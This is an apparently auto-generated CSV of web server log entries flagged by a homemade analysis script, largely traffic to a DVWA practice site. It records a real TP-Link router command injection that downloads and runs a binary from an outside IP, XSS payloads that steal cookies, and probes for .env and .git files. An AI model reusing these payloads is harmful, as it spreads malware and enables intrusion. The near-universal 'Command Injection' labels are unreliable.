access.log,Command Injection,06/Apr/2024:00:13:58 +0000,/,198.74.56.46,-
access.log,Command Injection,06/Apr/2024:00:14:25 +0000,/,172.104.11.4,-
access.log,Command Injection,06/Apr/2024:00:15:54 +0000,/,94.154.33.37,-
access.log,Command Injection,06/Apr/2024:00:19:43 +0000,http://google.com,93.115.29.69,-
access.log,Command Injection,06/Apr/2024:00:19:44 +0000,http://google.com/login.php,93.115.29.69,-
access.log,Error Codes,06/Apr/2024:00:24:09 +0000,/boaform/admin/formLogin,185.94.29.162,-
access.log,Command Injection,06/Apr/2024:00:24:09 +0000,/boaform/admin/formLogin,185.94.29.162,-
access.log,Command Injection,06/Apr/2024:00:35:16 +0000,/,45.79.181.94,-
access.log,XSS,06/Apr/2024:00:45:14 +0000,/login.php/?%3Cscript%3E,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:45:14 +0000,/login.php/?%3Cscript%3E,119.74.129.29,-
access.log,XSS,06/Apr/2024:00:45:14 +0000,/login.php/dvwa/css/login.css,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:45:14 +0000,/login.php/dvwa/css/login.css,119.74.129.29,-
access.log,XSS,06/Apr/2024:00:45:14 +0000,/login.php/dvwa/images/login_logo.png,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:45:14 +0000,/login.php/dvwa/images/login_logo.png,119.74.129.29,-
access.log,Unusual File Types and Paths,06/Apr/2024:00:45:27 +0000,/login.php/.config,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:45:27 +0000,/login.php/.config,119.74.129.29,-
access.log,Unusual File Types and Paths,06/Apr/2024:00:45:27 +0000,/login.php/dvwa/css/login.css,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:45:27 +0000,/login.php/dvwa/css/login.css,119.74.129.29,-
access.log,Unusual File Types and Paths,06/Apr/2024:00:45:27 +0000,/login.php/dvwa/images/login_logo.png,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:45:27 +0000,/login.php/dvwa/images/login_logo.png,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:45:57 +0000,/login.php/where=union,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:45:58 +0000,/login.php/dvwa/css/login.css,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:45:58 +0000,/login.php/dvwa/images/login_logo.png,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:53:35 +0000,/,146.19.24.28,-
access.log,Command Injection,06/Apr/2024:00:54:02 +0000,/log_analysis_report.html,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:54:02 +0000,/events_errors_line_plot.png,119.74.129.29,-
access.log,Error Codes,06/Apr/2024:00:54:02 +0000,/sd,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:54:02 +0000,/sd,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:01:22:22 +0000,/,69.164.217.245,-
access.log,Command Injection,06/Apr/2024:01:39:58 +0000,/,221.122.67.75,-
access.log,Command Injection,06/Apr/2024:01:39:58 +0000,/login.php,221.122.67.75,-
access.log,Command Injection,06/Apr/2024:01:44:12 +0000,/,172.104.11.34,-
access.log,Command Injection,06/Apr/2024:01:45:57 +0000,/,172.104.11.4,-
access.log,Command Injection,06/Apr/2024:01:46:29 +0000,/,45.79.181.223,-
access.log,Command Injection,06/Apr/2024:01:58:21 +0000,/,69.164.217.74,-
access.log,Command Injection,06/Apr/2024:02:03:16 +0000,/,146.19.24.28,-
access.log,Error Codes,06/Apr/2024:02:14:01 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:02:14:01 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:02:14:01 +0000,/,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:02:14:17 +0000,/,198.235.24.129,-
access.log,Command Injection,06/Apr/2024:02:31:17 +0000,/,66.175.213.4,-
access.log,Command Injection,06/Apr/2024:02:36:24 +0000,/,45.79.181.104,-
access.log,Command Injection,06/Apr/2024:02:45:36 +0000,/,185.224.128.43,-
access.log,Command Injection,06/Apr/2024:02:57:35 +0000,/log_analysis_report.html,101.127.15.128,-
access.log,Error Codes,06/Apr/2024:02:57:35 +0000,/sd,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:02:57:35 +0000,/sd,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:02:57:35 +0000,/events_errors_line_plot.png,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:03:09:52 +0000,/,146.19.24.28,-
access.log,Command Injection,06/Apr/2024:03:10:42 +0000,/log_analysis_report.html,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:03:10:42 +0000,/events_errors_line_plot.png,119.74.129.29,-
access.log,Error Codes,06/Apr/2024:03:10:42 +0000,/sd,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:03:10:42 +0000,/sd,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:03:34:00 +0000,/events_errors_line_plot.png,202.166.151.1,-
access.log,Error Codes,06/Apr/2024:03:34:00 +0000,/sd,202.166.151.1,-
access.log,Command Injection,06/Apr/2024:03:34:00 +0000,/sd,202.166.151.1,-
access.log,Command Injection,06/Apr/2024:03:34:01 +0000,/dvwa/css/main.css,202.166.151.1,-
access.log,Command Injection,06/Apr/2024:03:34:01 +0000,/dvwa/images/logo.png,202.166.151.1,-
access.log,Command Injection,06/Apr/2024:03:34:01 +0000,/dvwa/js/dvwaPage.js,202.166.151.1,-
access.log,Command Injection,06/Apr/2024:03:34:01 +0000,/dvwa/js/add_event_listeners.js,202.166.151.1,-
access.log,Command Injection,06/Apr/2024:03:39:25 +0000,/log_analysis_report.html,202.166.151.1,-
access.log,Error Codes,06/Apr/2024:03:39:25 +0000,/sd,202.166.151.1,-
access.log,Command Injection,06/Apr/2024:03:39:25 +0000,/sd,202.166.151.1,-
access.log,Command Injection,06/Apr/2024:03:40:17 +0000,-,202.166.151.1,-
access.log,Command Injection,06/Apr/2024:03:47:04 +0000,/,69.164.217.245,-
access.log,Command Injection,06/Apr/2024:03:47:54 +0000,/,45.79.181.94,-
access.log,Command Injection,06/Apr/2024:03:48:32 +0000,/,45.79.181.94,-
access.log,Error Codes,06/Apr/2024:03:58:38 +0000,/cgi-bin/luci/;stok=/locale?form=country&amp;operation=write&amp;country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk),185.224.128.34,-
access.log,Command Injection,06/Apr/2024:03:58:38 +0000,/cgi-bin/luci/;stok=/locale?form=country&amp;operation=write&amp;country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk),185.224.128.34,-
access.log,Error Codes,06/Apr/2024:03:58:58 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:03:58:58 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:03:58:58 +0000,/,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:04:09:42 +0000,/,45.79.128.205,-
access.log,Command Injection,06/Apr/2024:04:09:50 +0000,/,45.79.181.179,-
access.log,Command Injection,06/Apr/2024:04:11:13 +0000,/,45.79.163.53,-
access.log,Command Injection,06/Apr/2024:04:13:34 +0000,/,172.105.128.11,-
access.log,Command Injection,06/Apr/2024:04:21:44 +0000,/,45.33.80.243,-
access.log,Command Injection,06/Apr/2024:04:23:21 +0000,-,172.105.128.12,-
access.log,Command Injection,06/Apr/2024:04:33:21 +0000,-,205.210.31.137,-
access.log,Command Injection,06/Apr/2024:04:33:21 +0000,-,205.210.31.137,-
access.log,Error Codes,06/Apr/2024:05:21:49 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:05:21:49 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:05:21:49 +0000,/,54.36.115.221,-
access.log,Unusual Request Methods,06/Apr/2024:05:26:05 +0000,google.com:443,87.121.69.52,-
access.log,Command Injection,06/Apr/2024:05:26:05 +0000,google.com:443,87.121.69.52,-
access.log,Command Injection,06/Apr/2024:05:37:52 +0000,/,45.79.163.53,-
access.log,Command Injection,06/Apr/2024:05:40:34 +0000,/,172.104.11.51,-
access.log,Command Injection,06/Apr/2024:05:41:16 +0000,/,45.33.80.243,-
access.log,Command Injection,06/Apr/2024:05:41:33 +0000,/,172.104.11.46,-
access.log,Command Injection,06/Apr/2024:05:43:12 +0000,/,172.104.11.51,-
access.log,Command Injection,06/Apr/2024:05:43:31 +0000,/,172.104.11.4,-
access.log,Command Injection,06/Apr/2024:05:45:04 +0000,/,45.79.128.205,-
access.log,Command Injection,06/Apr/2024:05:47:29 +0000,/,45.79.181.223,-
access.log,Command Injection,06/Apr/2024:05:47:31 +0000,/,45.79.168.172,-
access.log,Command Injection,06/Apr/2024:05:50:05 +0000,/,172.104.11.51,-
access.log,Command Injection,06/Apr/2024:05:50:07 +0000,/,35.203.211.129,-
access.log,Command Injection,06/Apr/2024:05:50:08 +0000,/login.php,35.203.211.129,-
access.log,Command Injection,06/Apr/2024:05:50:46 +0000,/,66.175.213.4,-
access.log,Command Injection,06/Apr/2024:05:50:56 +0000,/,66.175.213.4,-
access.log,Command Injection,06/Apr/2024:05:51:05 +0000,/,172.105.128.12,-
access.log,Command Injection,06/Apr/2024:05:52:04 +0000,/,172.104.11.34,-
access.log,Command Injection,06/Apr/2024:05:52:51 +0000,/,172.104.11.4,-
access.log,Command Injection,06/Apr/2024:05:56:32 +0000,/,45.79.172.21,-
access.log,Command Injection,06/Apr/2024:05:59:28 +0000,/,172.105.128.13,-
access.log,Command Injection,06/Apr/2024:06:14:27 +0000,/,172.105.128.11,-
access.log,Command Injection,06/Apr/2024:06:16:36 +0000,/,172.105.128.11,-
access.log,Command Injection,06/Apr/2024:06:28:32 +0000,/,172.105.128.11,-
access.log,Command Injection,06/Apr/2024:06:28:48 +0000,/,172.105.128.11,-
access.log,Command Injection,06/Apr/2024:06:29:21 +0000,/,172.105.128.11,-
access.log,Command Injection,06/Apr/2024:06:29:32 +0000,/,172.105.128.11,-
access.log,Command Injection,06/Apr/2024:06:30:10 +0000,-,45.79.181.251,-
access.log,Command Injection,06/Apr/2024:06:30:40 +0000,/,172.105.128.11,-
access.log,Command Injection,06/Apr/2024:06:34:37 +0000,/,45.79.181.104,-
access.log,Unusual Request Methods,06/Apr/2024:06:39:38 +0000,google.com:443,45.125.66.34,-
access.log,Command Injection,06/Apr/2024:06:39:38 +0000,google.com:443,45.125.66.34,-
access.log,Command Injection,06/Apr/2024:06:41:14 +0000,/,185.180.140.5,-
access.log,Command Injection,06/Apr/2024:06:41:14 +0000,/login.php,185.180.140.5,-
access.log,Command Injection,06/Apr/2024:06:46:12 +0000,-,198.235.24.74,-
access.log,Command Injection,06/Apr/2024:06:46:12 +0000,-,198.235.24.74,-
access.log,Command Injection,06/Apr/2024:06:46:19 +0000,/,146.19.24.28,-
access.log,Error Codes,06/Apr/2024:06:54:03 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:06:54:03 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:06:54:03 +0000,/,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:06:57:12 +0000,/,185.191.126.213,-
access.log,Command Injection,06/Apr/2024:07:28:59 +0000,/,198.235.24.30,-
access.log,Command Injection,06/Apr/2024:07:29:25 +0000,/,74.82.47.4,-
access.log,Command Injection,06/Apr/2024:07:32:10 +0000,/,74.82.47.4,-
access.log,Command Injection,06/Apr/2024:07:32:10 +0000,/login.php,74.82.47.4,-
access.log,Command Injection,06/Apr/2024:07:32:58 +0000,/favicon.ico,74.82.47.4,-
access.log,Error Codes,06/Apr/2024:07:33:56 +0000,/geoserver/web/,74.82.47.4,-
access.log,Command Injection,06/Apr/2024:07:33:56 +0000,/geoserver/web/,74.82.47.4,-
access.log,Command Injection,06/Apr/2024:07:35:47 +0000,/,198.235.24.134,-
access.log,Command Injection,06/Apr/2024:07:39:44 +0000,/,185.180.143.190,-
access.log,Command Injection,06/Apr/2024:07:39:44 +0000,/login.php,185.180.143.190,-
access.log,Command Injection,06/Apr/2024:07:44:48 +0000,/,198.74.56.46,-
access.log,Command Injection,06/Apr/2024:07:45:09 +0000,/,172.104.11.46,-
access.log,Command Injection,06/Apr/2024:07:46:44 +0000,/,45.33.80.243,-
access.log,Command Injection,06/Apr/2024:07:47:22 +0000,/,192.155.90.118,-
access.log,Command Injection,06/Apr/2024:07:47:51 +0000,/,192.155.90.118,-
access.log,Command Injection,06/Apr/2024:07:48:15 +0000,/,172.104.11.34,-
access.log,Command Injection,06/Apr/2024:07:48:31 +0000,/,66.175.213.4,-
access.log,Error Codes,06/Apr/2024:07:54:58 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:07:54:58 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:07:54:59 +0000,/,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:08:02:32 +0000,/,45.79.181.223,-
access.log,Command Injection,06/Apr/2024:08:05:23 +0000,/,172.105.128.13,-
access.log,Command Injection,06/Apr/2024:08:06:57 +0000,/,185.224.128.43,-
access.log,Command Injection,06/Apr/2024:08:07:44 +0000,/,45.79.128.205,-
access.log,Command Injection,06/Apr/2024:08:07:56 +0000,/,45.79.128.205,-
access.log,Command Injection,06/Apr/2024:08:08:08 +0000,/,45.79.172.21,-
access.log,Command Injection,06/Apr/2024:08:09:25 +0000,/,45.79.172.21,-
access.log,Command Injection,06/Apr/2024:08:13:54 +0000,/,172.105.128.13,-
access.log,Command Injection,06/Apr/2024:08:17:05 +0000,/,87.246.7.66,-
access.log,Command Injection,06/Apr/2024:08:18:09 +0000,-,172.104.11.34,-
access.log,Command Injection,06/Apr/2024:08:18:44 +0000,/,146.19.24.28,-
access.log,Command Injection,06/Apr/2024:08:22:48 +0000,/,45.79.168.172,-
access.log,Error Codes,06/Apr/2024:08:37:49 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:08:37:49 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:08:37:49 +0000,/,54.36.115.221,-
access.log,Error Codes,06/Apr/2024:08:38:18 +0000,/.env,4.229.241.170,-
access.log,Command Injection,06/Apr/2024:08:38:18 +0000,/.env,4.229.241.170,-
access.log,Command Injection,06/Apr/2024:08:38:18 +0000,/,4.229.241.170,-
access.log,Command Injection,06/Apr/2024:08:41:31 +0000,/,45.79.181.251,-
access.log,Command Injection,06/Apr/2024:08:45:14 +0000,/,87.246.7.86,-
access.log,Command Injection,06/Apr/2024:08:50:03 +0000,/,45.79.181.104,-
access.log,Command Injection,06/Apr/2024:08:55:04 +0000,/,162.142.125.212,-
access.log,Command Injection,06/Apr/2024:08:55:08 +0000,/,162.142.125.212,-
access.log,Error Codes,06/Apr/2024:08:55:11 +0000,*,162.142.125.212,-
access.log,Command Injection,06/Apr/2024:08:55:11 +0000,*,162.142.125.212,-
access.log,Command Injection,06/Apr/2024:08:55:14 +0000,/login.php,162.142.125.212,-
access.log,Error Codes,06/Apr/2024:08:55:15 +0000,*,162.142.125.212,-
access.log,Command Injection,06/Apr/2024:08:55:15 +0000,*,162.142.125.212,-
access.log,Command Injection,06/Apr/2024:08:55:15 +0000,/favicon.ico,162.142.125.212,-
access.log,Command Injection,06/Apr/2024:09:12:37 +0000,/,172.104.11.4,-
access.log,Command Injection,06/Apr/2024:09:12:41 +0000,/,172.105.128.13,-
access.log,Command Injection,06/Apr/2024:09:12:51 +0000,/,66.175.213.4,-
access.log,Command Injection,06/Apr/2024:09:38:56 +0000,/,146.19.24.28,-
access.log,Command Injection,06/Apr/2024:09:42:29 +0000,/,94.156.65.188,-
access.log,Error Codes,06/Apr/2024:09:42:30 +0000,/.git/config,94.156.65.188,-
access.log,Command Injection,06/Apr/2024:09:42:30 +0000,/.git/config,94.156.65.188,-
access.log,Error Codes,06/Apr/2024:10:26:19 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:10:26:19 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:10:26:20 +0000,/,54.36.115.221,-
access.log,Error Codes,06/Apr/2024:10:28:20 +0000,/.env,103.145.255.242,-
access.log,Command Injection,06/Apr/2024:10:28:20 +0000,/.env,103.145.255.242,-
access.log,Command Injection,06/Apr/2024:10:28:21 +0000,/,103.145.255.242,-
access.log,Command Injection,06/Apr/2024:10:30:26 +0000,-,192.155.90.220,-
access.log,Command Injection,06/Apr/2024:10:41:46 +0000,/,162.216.149.233,-
access.log,Command Injection,06/Apr/2024:10:41:46 +0000,/login.php,162.216.149.233,-
access.log,Command Injection,06/Apr/2024:10:42:37 +0000,/,146.19.24.28,-
access.log,Unusual Request Methods,06/Apr/2024:11:15:46 +0000,google.com:443,87.121.69.52,-
access.log,Command Injection,06/Apr/2024:11:15:46 +0000,google.com:443,87.121.69.52,-
access.log,Command Injection,06/Apr/2024:11:22:56 +0000,/,192.155.88.231,-
access.log,Command Injection,06/Apr/2024:11:24:35 +0000,/,45.79.181.104,-
access.log,Command Injection,06/Apr/2024:11:30:09 +0000,/,185.18.108.22,-
access.log,Command Injection,06/Apr/2024:11:31:10 +0000,/,45.79.181.94,-
access.log,Command Injection,06/Apr/2024:11:34:51 +0000,-,184.105.247.196,-
access.log,Command Injection,06/Apr/2024:11:56:58 +0000,/,146.19.24.28,-
access.log,Error Codes,06/Apr/2024:12:12:42 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:12:12:42 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:12:12:42 +0000,/,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:12:19:04 +0000,/,34.140.130.61,-
access.log,Command Injection,06/Apr/2024:12:27:28 +0000,/,45.79.181.104,-
access.log,Command Injection,06/Apr/2024:12:38:03 +0000,/,45.79.181.104,-
access.log,Error Codes,06/Apr/2024:12:47:01 +0000,/.env,78.153.140.177,-
access.log,Command Injection,06/Apr/2024:12:47:01 +0000,/.env,78.153.140.177,-
access.log,Command Injection,06/Apr/2024:12:47:02 +0000,-,78.153.140.177,-
access.log,Command Injection,06/Apr/2024:13:00:57 +0000,/,185.224.128.43,-
access.log,Unusual Request Methods,06/Apr/2024:13:00:58 +0000,/cdn-cgi/trace,139.59.101.104,-
access.log,Error Codes,06/Apr/2024:13:00:58 +0000,/cdn-cgi/trace,139.59.101.104,-
access.log,Command Injection,06/Apr/2024:13:00:58 +0000,/cdn-cgi/trace,139.59.101.104,-
access.log,Command Injection,06/Apr/2024:13:32:38 +0000,/,192.155.88.231,-
access.log,Command Injection,06/Apr/2024:13:37:44 +0000,/,146.19.24.28,-
access.log,Command Injection,06/Apr/2024:13:40:07 +0000,/,192.155.88.231,-
access.log,Command Injection,06/Apr/2024:13:46:31 +0000,/log_analysis_report_shafeek.html,101.127.15.128,-
access.log,Error Codes,06/Apr/2024:13:46:31 +0000,/s&#x27;,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:46:31 +0000,/s&#x27;,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:46:31 +0000,/events_errors_line_plot.png,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:48:28 +0000,/,192.155.90.220,-
access.log,Command Injection,06/Apr/2024:13:48:48 +0000,-,185.161.248.148,-
access.log,Command Injection,06/Apr/2024:13:49:32 +0000,/,45.79.181.179,-
access.log,Error Codes,06/Apr/2024:13:56:18 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:13:56:18 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:13:56:19 +0000,/,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:13:58:07 +0000,/log_analysis_report_shafeek.html,101.127.15.128,-
access.log,Error Codes,06/Apr/2024:13:58:08 +0000,/s&#x27;,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:08 +0000,/s&#x27;,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:11 +0000,/,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:11 +0000,/login.php,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:11 +0000,/dvwa/css/login.css,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:11 +0000,/dvwa/images/login_logo.png,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:15 +0000,/login.php,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:15 +0000,/index.php,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:16 +0000,/dvwa/css/main.css,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:16 +0000,/dvwa/js/dvwaPage.js,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:16 +0000,/dvwa/js/add_event_listeners.js,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:16 +0000,/dvwa/images/logo.png,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:19 +0000,/security.php,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:20 +0000,/dvwa/images/lock.png,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:22 +0000,/security.php,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:22 +0000,/security.php,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:34 +0000,/vulnerabilities/open_redirect/,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:36 +0000,/vulnerabilities/javascript/,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:38 +0000,/vulnerabilities/sqli_blind/,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:39 +0000,/vulnerabilities/weak_id/,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:40 +0000,/vulnerabilities/sqli/,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:42 +0000,/vulnerabilities/xss_d/,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:42 +0000,/vulnerabilities/xss_r/,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:45 +0000,/vulnerabilities/xss_s/,101.127.15.128,-
access.log,Error Codes,06/Apr/2024:13:58:45 +0000,/vulnerabilities/xss_s/sd,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:45 +0000,/vulnerabilities/xss_s/sd,101.127.15.128,-
access.log,Error Codes,06/Apr/2024:13:58:45 +0000,/vulnerabilities/xss_s/s%3Cbr,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:45 +0000,/vulnerabilities/xss_s/s%3Cbr,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:57 +0000,/vulnerabilities/upload/,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:59 +0000,/vulnerabilities/fi/?page=include.php,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:58:59 +0000,/vulnerabilities/exec/,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:59:11 +0000,/vulnerabilities/exec/,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:59:12 +0000,/vulnerabilities/exec/,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:13:59:28 +0000,-,66.175.213.4,-
access.log,Command Injection,06/Apr/2024:14:00:04 +0000,-,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:14:03:32 +0000,/,172.104.11.34,-
access.log,Command Injection,06/Apr/2024:14:07:39 +0000,/log_analysis_report.html,101.127.15.128,-
access.log,Error Codes,06/Apr/2024:14:07:40 +0000,/sd,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:14:07:40 +0000,/sd,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:14:08:31 +0000,-,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:14:13:00 +0000,/,172.104.11.46,-
access.log,Command Injection,06/Apr/2024:14:30:36 +0000,/,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:14:31:27 +0000,-,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:14:49:45 +0000,/,192.155.90.220,-
access.log,Command Injection,06/Apr/2024:14:53:31 +0000,/,192.155.90.220,-
access.log,Command Injection,06/Apr/2024:14:59:46 +0000,/security.php,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:14:59:51 +0000,/vulnerabilities/exec/,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:15:00:09 +0000,/vulnerabilities/exec/,101.127.15.128,-
access.log.1,Command Injection,05/Apr/2024:15:13:31 +0000,/vulnerabilities/sqli/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:13:32 +0000,/vulnerabilities/sqli/,202.166.151.1,-
access.log.1,Unusual Request Methods,05/Apr/2024:15:13:34 +0000,/vulnerabilities/sqli/session-input.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:13:34 +0000,/vulnerabilities/sqli/session-input.php,202.166.151.1,-
access.log.1,Unusual Request Methods,05/Apr/2024:15:13:45 +0000,/vulnerabilities/sqli/session-input.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:13:45 +0000,/vulnerabilities/sqli/session-input.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:13:45 +0000,/vulnerabilities/sqli/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:13:50 +0000,/vulnerabilities/captcha/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:13:50 +0000,/vulnerabilities/sqli/,202.166.151.1,-
access.log.1,Unusual Request Methods,05/Apr/2024:15:13:56 +0000,/vulnerabilities/sqli/session-input.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:13:56 +0000,/vulnerabilities/sqli/session-input.php,202.166.151.1,-
access.log.1,Unusual Request Methods,05/Apr/2024:15:13:58 +0000,/vulnerabilities/sqli/session-input.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:13:58 +0000,/vulnerabilities/sqli/session-input.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:13:58 +0000,/vulnerabilities/sqli/,202.166.151.1,-
access.log.1,Unusual Request Methods,05/Apr/2024:15:14:04 +0000,/vulnerabilities/sqli/session-input.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:14:04 +0000,/vulnerabilities/sqli/session-input.php,202.166.151.1,-
access.log.1,Unusual Request Methods,05/Apr/2024:15:14:05 +0000,/vulnerabilities/sqli/session-input.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:14:05 +0000,/vulnerabilities/sqli/session-input.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:14:06 +0000,/vulnerabilities/sqli/,202.166.151.1,-
access.log.1,Unusual Request Methods,05/Apr/2024:15:14:10 +0000,/vulnerabilities/sqli/session-input.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:14:10 +0000,/vulnerabilities/sqli/session-input.php,202.166.151.1,-
access.log.1,Unusual Request Methods,05/Apr/2024:15:14:11 +0000,/vulnerabilities/sqli/session-input.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:14:11 +0000,/vulnerabilities/sqli/session-input.php,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:14:12 +0000,/vulnerabilities/sqli/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:14:17 +0000,/vulnerabilities/xss_d/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:14:37 +0000,/vulnerabilities/xss_d/?default=French,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:14:47 +0000,/vulnerabilities/xss_r/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:14:58 +0000,/vulnerabilities/xss_r/?name=+%3Cimg+src%3Dss+onError%3Dalert%28%22XSS%29%3E,202.166.151.1,-
access.log.1,Error Codes,05/Apr/2024:15:14:58 +0000,/vulnerabilities/xss_r/ss,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:14:58 +0000,/vulnerabilities/xss_r/ss,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:15:01 +0000,/vulnerabilities/xss_r/?name=%3Cbody+onload%3Dalert%28document.cookie%29%3E,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:15:05 +0000,/vulnerabilities/xss_s/,202.166.151.1,-
access.log.1,Error Codes,05/Apr/2024:15:15:05 +0000,/vulnerabilities/xss_s/sd,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:15:05 +0000,/vulnerabilities/xss_s/sd,202.166.151.1,-
access.log.1,Error Codes,05/Apr/2024:15:15:05 +0000,/vulnerabilities/xss_s/s%3Cbr,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:15:05 +0000,/vulnerabilities/xss_s/s%3Cbr,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:15:30 +0000,/vulnerabilities/xss_s/,202.166.151.1,-
access.log.1,Error Codes,05/Apr/2024:15:15:30 +0000,/vulnerabilities/xss_s/sd,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:15:30 +0000,/vulnerabilities/xss_s/sd,202.166.151.1,-
access.log.1,Error Codes,05/Apr/2024:15:15:30 +0000,/vulnerabilities/xss_s/s%3Cbr,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:15:30 +0000,/vulnerabilities/xss_s/s%3Cbr,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:15:39 +0000,/vulnerabilities/sqli_blind/,202.166.151.1,-
